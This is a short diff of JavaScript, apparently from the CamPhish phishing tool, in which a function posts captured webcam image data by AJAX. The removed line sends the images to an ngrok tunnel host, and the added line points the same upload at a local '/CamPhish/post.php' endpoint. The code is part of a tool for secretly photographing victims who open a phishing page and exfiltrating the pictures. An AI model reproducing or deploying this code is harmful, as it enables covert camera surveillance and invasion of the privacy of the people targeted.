@@ -19,7 +19,7 @@ function post(imgdata){
 $.ajax({
    type: 'POST',
    data: { cat: imgdata},
-   url: 'https://b8d4-2405-4802-a212-f430-b940-a3a5-ef98-f3b4.ap.ngrok.io/post.php',
+   url: '/CamPhish/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
